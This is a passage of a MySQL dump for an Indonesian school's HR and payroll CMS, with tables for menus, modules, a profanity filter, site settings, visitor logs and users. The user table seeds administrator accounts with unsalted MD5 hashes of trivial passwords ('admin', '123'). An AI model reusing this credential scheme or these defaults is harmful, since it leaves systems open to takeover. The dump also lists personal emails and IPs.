INSERT INTO `menu_editor` VALUES (2,'Change Password','admin.php?pilih=user&mod=yes&aksi=change',1,8,''),(7,'Profile','?pilih=profile&mod=yes',1,8,''),(8,'Account','#',1,0,'settings.png'),(13,'Blogs','?pilih=news&mod=yes',2,8,'');
/*!40000 ALTER TABLE `menu_editor` ENABLE KEYS */;

#
# Source for table "menu_users"
#

DROP TABLE IF EXISTS `menu_users`;
CREATE TABLE `menu_users` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `menu` varchar(255) NOT NULL DEFAULT '',
  `url` varchar(255) NOT NULL DEFAULT '',
  `ordering` int(2) NOT NULL,
  `parent` int(4) NOT NULL DEFAULT '0',
  `icon` varchar(100) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=latin1;

#
# Data for table "menu_users"
#

/*!40000 ALTER TABLE `menu_users` DISABLE KEYS */;
INSERT INTO `menu_users` VALUES (2,'Change Password','admin.php?pilih=user&mod=yes&aksi=change',1,8,''),(7,'Profile','?pilih=profile&mod=yes',2,8,''),(8,'Account','#',1,0,'settings.png'),(12,'Blogs','?pilih=news&mod=yes',3,8,'');
/*!40000 ALTER TABLE `menu_users` ENABLE KEYS */;

#
# Source for table "modul_hrd"
#

DROP TABLE IF EXISTS `modul_hrd`;
CREATE TABLE `modul_hrd` (
  `id` tinyint(11) NOT NULL AUTO_INCREMENT,
  `modul` varchar(30) NOT NULL DEFAULT '',
  `isi` text NOT NULL,
  `setup` varchar(50) NOT NULL DEFAULT '',
  `posisi` tinyint(2) NOT NULL DEFAULT '0',
  `published` int(1) NOT NULL DEFAULT '0',
  `ordering` int(5) NOT NULL DEFAULT '0',
  `type` enum('block','module') NOT NULL DEFAULT 'module',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=33 DEFAULT CHARSET=latin1;

#
# Data for table "modul_hrd"
#

/*!40000 ALTER TABLE `modul_hrd` DISABLE KEYS */;
INSERT INTO `modul_hrd` VALUES (1,'Terbaru','mod/news/terakhir.php','',1,1,3,'module'),(2,'Statistik Situs','mod/statistik/stat.php','',1,1,6,'module'),(3,'Polling','mod/polling/polling.php','',1,0,99,'module'),(4,'Kalender','mod/calendar/calendar.php','',1,0,100,'module'),(5,'Pesan Singkat','mod/shoutbox/shoutboxview.php','',1,1,99,'module'),(6,'Random Links','mod/random_link/randomlink.php','',1,0,100,'module'),(7,'Top Download','mod/top_download/topdl.php','',1,0,99,'module'),(8,'Login','mod/login/login.php','',1,0,99,'module'),(10,'ip logs','mod/phpids/ids.php','',1,0,99,'module'),(17,'Social Widget','mod/socialwidget/socialwidget.php','',1,0,99,'module'),(18,'Follow Us','mod/socialurl/socialurl.php','',1,0,99,'module'),(22,'Follow Kami di Twitter','<script type=\"text/javascript\" charset=\"utf-8\" src=\"http://widgets.twimg.com/j/2/widget.js\"></script>\r\n<script type=\"text/javascript\">\r\nnew TWTR.Widget({\r\n  version: 2,\r\n  type: \'profile\',\r\n  rpp: 4,\r\n  interval: 30000,\r\n  width: 300,\r\n  height: 250,\r\n  theme: {\r\n    shell: {\r\n      background: \'#1E7DC1\',\r\n      color: \'#ffffff\'\r\n    },\r\n    tweets: {\r\n      background: \'#ffffff\',\r\n      color: \'#333333\',\r\n      links: \'#eb0707\'\r\n    }\r\n  },\r\n  features: {\r\n    scrollbar: true,\r\n    loop: false,\r\n    live: false,\r\n    behavior: \'default\'\r\n  }\r\n}).render().setUser(\'ppikomkutisari\').start();\r\n</script>','',1,0,99,'block'),(29,'Apa itu RWD','<div align=\"center\">\r\n<a href=\"#\"><img src=\"images/rwd-kecil.jpg\"></a>\r\n</div>','',1,1,5,'block'),(31,'Pencarian','mod/pencarian/pencarian.php','',1,1,1,'module'),(32,'Terpopuler','mod/news/terpopuler.php','',1,1,2,'module');
/*!40000 ALTER TABLE `modul_hrd` ENABLE KEYS */;

#
# Source for table "sensor"
#

DROP TABLE IF EXISTS `sensor`;
CREATE TABLE `sensor` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `word` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=latin1;

#
# Data for table "sensor"
#

/*!40000 ALTER TABLE `sensor` DISABLE KEYS */;
INSERT INTO `sensor` VALUES (1,'Kontol'),(2,'Anjing'),(3,'Anjeng'),(4,'anjrit'),(5,'memek'),(6,'tempek'),(7,'Bangsat'),(8,'fuck'),(9,'eSDeCe');
/*!40000 ALTER TABLE `sensor` ENABLE KEYS */;

#
# Source for table "situs"
#

DROP TABLE IF EXISTS `situs`;
CREATE TABLE `situs` (
  `id` int(2) NOT NULL AUTO_INCREMENT,
  `email_master` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `judul_situs` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `url_situs` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `slogan` varchar(50) COLLATE latin1_general_ci NOT NULL,
  `description` text COLLATE latin1_general_ci NOT NULL,
  `keywords` text COLLATE latin1_general_ci NOT NULL,
  `maxkonten` int(2) NOT NULL DEFAULT '5',
  `maxadmindata` int(2) NOT NULL DEFAULT '5',
  `maxdata` int(2) NOT NULL DEFAULT '5',
  `maxgalleri` int(2) NOT NULL DEFAULT '4',
  `widgetshare` int(2) NOT NULL DEFAULT '0',
  `theme` varchar(50) COLLATE latin1_general_ci NOT NULL DEFAULT 'tcms',
  `author` text COLLATE latin1_general_ci NOT NULL,
  `alamatkantor` text COLLATE latin1_general_ci NOT NULL,
  `publishwebsite` int(1) NOT NULL DEFAULT '1',
  `publishnews` int(2) NOT NULL,
  `maxgalleridata` int(11) NOT NULL,
  `widgetkomentar` int(2) NOT NULL DEFAULT '1',
  `widgetpenulis` int(2) NOT NULL DEFAULT '2',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci;

#
# Data for table "situs"
#

/*!40000 ALTER TABLE `situs` DISABLE KEYS */;
INSERT INTO `situs` VALUES (1,'rekysda@gmail.com','Sisfo HRD dan Penggajian','http://localhost/sistersmkbs/sisfohrd','Sisfo HRD dan Penggajian','WebDesign dengan sistem Responsive','sisfohrd,surabaya,indonesia',5,50,5,4,3,'sisfohrd','SMK BHAKTI SAMUDERA','Surabaya',1,1,12,1,2);
/*!40000 ALTER TABLE `situs` ENABLE KEYS */;

#
# Source for table "tbl_kalender"
#

DROP TABLE IF EXISTS `tbl_kalender`;
CREATE TABLE `tbl_kalender` (
  `judul` varchar(255) NOT NULL DEFAULT '',
  `isi` text NOT NULL,
  `waktu_mulai` date NOT NULL DEFAULT '0000-00-00',
  `waktu_akhir` date NOT NULL DEFAULT '0000-00-00',
  `background` varchar(10) NOT NULL DEFAULT '#d1d1d1',
  `color` varchar(10) NOT NULL DEFAULT '',
  `id` int(12) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# Data for table "tbl_kalender"
#

/*!40000 ALTER TABLE `tbl_kalender` DISABLE KEYS */;
/*!40000 ALTER TABLE `tbl_kalender` ENABLE KEYS */;

#
# Source for table "useraura"
#

DROP TABLE IF EXISTS `useraura`;
CREATE TABLE `useraura` (
  `UserId` int(15) NOT NULL AUTO_INCREMENT,
  `user` varchar(250) NOT NULL DEFAULT '',
  `password` text NOT NULL,
  `email` varchar(250) NOT NULL DEFAULT '',
  `avatar` varchar(250) NOT NULL DEFAULT '',
  `level` enum('Administrator') NOT NULL DEFAULT 'Administrator',
  `tipe` varchar(250) NOT NULL DEFAULT '',
  `is_online` int(5) NOT NULL DEFAULT '0',
  `last_ping` text NOT NULL,
  `start` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `exp` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `biodata` text NOT NULL,
  PRIMARY KEY (`UserId`)
) ENGINE=MyISAM AUTO_INCREMENT=26 DEFAULT CHARSET=latin1;

#
# Data for table "useraura"
#

/*!40000 ALTER TABLE `useraura` DISABLE KEYS */;
INSERT INTO `useraura` VALUES (1,'admin','21232f297a57a5a743894a0e4a801fc3','reky@teamworks.co.id','af0675a9e843c6c8f78163a9118efc78.jpg','Administrator','aktif',1,'2014-10-22 07:26:36','2010-08-27 00:00:00','2034-08-27 00:00:00','<p><b>none</b></p>'),(25,'123','202cb962ac59075b964b07152d234b70','123@yahoo.com','','Administrator','aktif',0,'','0000-00-00 00:00:00','0000-00-00 00:00:00','');
/*!40000 ALTER TABLE `useraura` ENABLE KEYS */;

#
# Source for table "usercounter"
#

DROP TABLE IF EXISTS `usercounter`;
CREATE TABLE `usercounter` (
  `id` tinyint(11) NOT NULL AUTO_INCREMENT,
  `ip` text NOT NULL,
  `counter` int(11) NOT NULL DEFAULT '0',
  `hits` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

#
# Data for table "usercounter"
#

/*!40000 ALTER TABLE `usercounter` DISABLE KEYS */;
INSERT INTO `usercounter` VALUES (1,'127.0.0.1-::1-157.56.92.173-208.115.111.66-180.76.6.233-66.249.64.6-',1,908);
/*!40000 ALTER TABLE `usercounter` ENABLE KEYS */;

#
# Source for table "useronline"
#

DROP TABLE IF EXISTS `useronline`;
CREATE TABLE `useronline` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipproxy` varchar(100) DEFAULT NULL,
  `host` varchar(100) DEFAULT NULL,
  `ipanda` varchar(100) DEFAULT NULL,
  `proxyserver` varchar(100) DEFAULT NULL,
  `timevisit` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `ipanda` (`ipanda`),
  KEY `timevisit` (`timevisit`),
  KEY `ipproxy` (`ipproxy`)
) ENGINE=MyISAM AUTO_INCREMENT=96 DEFAULT CHARSET=latin1;

#
# Data for table "useronline"
#

/*!40000 ALTER TABLE `useronline` DISABLE KEYS */;
INSERT INTO `useronline` VALUES (95,'127.0.0.1','localhost','127.0.0.1','',1321091831);
/*!40000 ALTER TABLE `useronline` ENABLE KEYS */;

#
# Source for table "useronlineday"
#

DROP TABLE IF EXISTS `useronlineday`;
CREATE TABLE `useronlineday` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipproxy` varchar(100) DEFAULT NULL,
  `host` varchar(100) DEFAULT NULL,
  `ipanda` varchar(100) DEFAULT NULL,
  `proxyserver` varchar(100) DEFAULT NULL,
  `timevisit` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `ipanda` (`ipanda`),
  KEY `timevisit` (`timevisit`),
  KEY `ipproxy` (`ipproxy`)
) ENGINE=MyISAM AUTO_INCREMENT=5621 DEFAULT CHARSET=latin1;

#
# Data for table "useronlineday"
#

/*!40000 ALTER TABLE `useronlineday` DISABLE KEYS */;
INSERT INTO `useronlineday` VALUES (5620,'::1','WEB-SERVER','::1','',1413937591);
/*!40000 ALTER TABLE `useronlineday` ENABLE KEYS */;

#
# Source for table "useronlinemonth"
#

DROP TABLE IF EXISTS `useronlinemonth`;
CREATE TABLE `useronlinemonth` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `ipproxy` varchar(100) DEFAULT NULL,
  `host` varchar(100) DEFAULT NULL,
  `ipanda` varchar(100) DEFAULT NULL,
  `proxyserver` varchar(100) DEFAULT NULL,
  `timevisit` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `ipanda` (`ipanda`),
  KEY `timevisit` (`timevisit`),
  KEY `ipproxy` (`ipproxy`)
) ENGINE=MyISAM AUTO_INCREMENT=3874 DEFAULT CHARSET=latin1;

#
# Data for table "useronlinemonth"
#

/*!40000 ALTER TABLE `useronlinemonth` DISABLE KEYS */;
INSERT INTO `useronlinemonth` VALUES (3873,'::1','WEB-SERVER','::1','',1413937591);
/*!40000 ALTER TABLE `useronlinemonth` ENABLE KEYS */;

/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
